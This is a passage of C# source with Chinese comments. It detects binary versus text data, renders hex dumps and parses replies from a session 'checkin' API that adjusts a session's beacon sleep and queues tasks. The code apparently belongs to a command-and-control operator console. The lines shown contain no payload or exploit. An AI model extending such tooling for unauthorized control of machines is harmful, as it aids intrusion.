                // 严格 UTF-8 已失败 = 不是 UTF-8 文本; 剩下唯一"这还是文本"的理由是
                // GBK 中文 —— 要求解出来的汉字占全文至少 1/10 (中文文档里这个比例
                // 远高于此, 而二进制乱码通常一个汉字都凑不出)。据不成立就按二进制
                // 只给十六进制, 而不是端出一屏乱码说"内容就是这样"。
                if (dc.Replaced > 0 || cjk * 10 < gbk.Length) dc.IsBinary = true;
            }

            // 3) 控制字符占比 (排掉 \t \r \n 这三个文本里合法出现的)
            int ctrl = 0;
            for (int i = 0; i < b.Length; i++)
            {
                byte v = b[i];
                if (v >= 0x20 || v == 0x09 || v == 0x0A || v == 0x0D) continue;
                ctrl++;
            }
            dc.ControlChars = ctrl;
            if (ctrl * 100L > dc.Size * 8L) dc.IsBinary = true;

            // 4) 剥 BOM (显示用) —— 只有确认是文本才剥
            if (!dc.IsBinary && dc.Text.Length > 0 && dc.Text[0] == '\uFEFF')
                dc.Text = dc.Text.Substring(1);
            return dc;
        }

        /// <summary>严格 UTF-8 解码; 失败返回 null (不让替换字符混进判定)。</summary>
        public static string TryStrictUtf8(byte[] data)
        {
            if (data == null || data.Length == 0) return "";
            try { return new UTF8Encoding(false, true).GetString(data); }
            catch { return null; }
        }

        private static int CountChar(string s, char ch)
        {
            int n = 0;
            for (int i = 0; i < s.Length; i++) if (s[i] == ch) n++;
            return n;
        }

        /// <summary>
        /// 经典 <c>偏移  16 字节十六进制  |ASCII|</c> 转储。不截断 —— 数据完整性优先,
        /// 只读窗口用 TextBox 自带虚拟化渲染, 不会因为几万行卡死。
        /// </summary>
        public static string HexDump(byte[] data)
        {
            if (data == null || data.Length == 0) return "(空)\n";
            var sb = new StringBuilder(data.Length * 4 + 64);
            for (int i = 0; i < data.Length; i += 16)
            {
                int n = data.Length - i;
                if (n > 16) n = 16;

                sb.Append(i.ToString("x8")).Append("  ");
                for (int j = 0; j < 16; j++)
                {
                    if (j < n) sb.Append(data[i + j].ToString("x2"));
                    else sb.Append("  ");
                    sb.Append(j == 7 ? "  " : " ");
                }
                sb.Append(" |");
                for (int j = 0; j < n; j++)
                {
                    byte v = data[i + j];
                    sb.Append(v >= 0x20 && v < 0x7F ? (char)v : '.');
                }
                sb.Append("|\n");
            }
            return sb.ToString();
        }
    }

    // ---------------------------------------------------------------- 催心跳 (checkin)

    /// <summary>/api/session/checkin 的结果信封 (文案可直接进状态栏)。</summary>
    public sealed class CheckinOp
    {
        public bool Ok;
        public long Task;
        public string Sid = "";
        public string Error = "";
        public string Text = "";
        /// <summary>true = 本地就没发出去 (v1 会话) —— 不算服务端拒绝。</summary>
        public bool LocalOnly;
    }

    /// <summary>
    /// 催心跳的结果文案 (纯函数, --selftest 直接断言)。
    ///
    /// 服务端语义 (go/v2_api.go handleSessionCheckin, 只读核对): 成功时把该会话
    /// sleep 临时压到 100ms 并下发一条 sleep 任务, **收到该会话下一次上行后才恢复原值**;
    /// 非 v2 会话一律回 <c>{"ok":false,"error":"仅 v2 会话支持 checkin"}</c> —— 那一句
    /// 原样显示, 不翻译成"失败"了事, 因为它是能力边界而不是错误。
    /// </summary>
    public static class SessionParse
    {
        /// <summary>成功的文案: 必须把"下一次上行后自动恢复原 sleep"讲出来, 否则操作员会以为 sleep 被永久改了。</summary>
        public const string CheckinOkTail = "已催, 下一次上行后自动恢复原 sleep";

        /// <summary>v1 会话的本地拦截文案 (服务端对 v1 恒回 ok=false, 不必白跑一次)。</summary>
        public const string CheckinV1Hint = "v1 会话不支持 checkin (服务端仅 v2 会话可催心跳)";

        public static CheckinOp FromJson(JsonElement root, string sid)
        {
            var op = new CheckinOp();
            op.Sid = sid ?? "";
            op.Ok = root.Bool("ok");
            op.Task = root.Long("task", -1);
            op.Error = root.Str("error");
            if (op.Ok)
            {
                op.Text = "会话 " + op.Sid + " " + CheckinOkTail
                        + (op.Task >= 0 ? " (task#" + op.Task.ToString() + ")" : "");
            }
            else
            {
                // error 原样透出; 服务端没给 error 时才退化成一句通用话术
                op.Text = op.Error.Length > 0 ? op.Error : "服务端返回 ok=false 且没有 error 字段";
            }
            return op;
        }

        public static CheckinOp FromException(string sid, Exception ex)
        {
            var op = new CheckinOp();
            op.Sid = sid ?? "";
            op.Text = ex == null ? "催心跳失败 (无异常信息)" : ex.Message;
            return op;
        }

        /// <summary>未登录 / 401 的文案 (与报告导出口径一致, 都走 ApiError)。</summary>
        public static string NeedLoginText(int code, string body, string path)
        {
            return ApiError.Describe(code, body, path);
        }

        /// <summary>未选会话时状态栏的提示。</summary>
        public static string NoSessionText { get { return "请先在会话表选择一行"; } }
    }
}
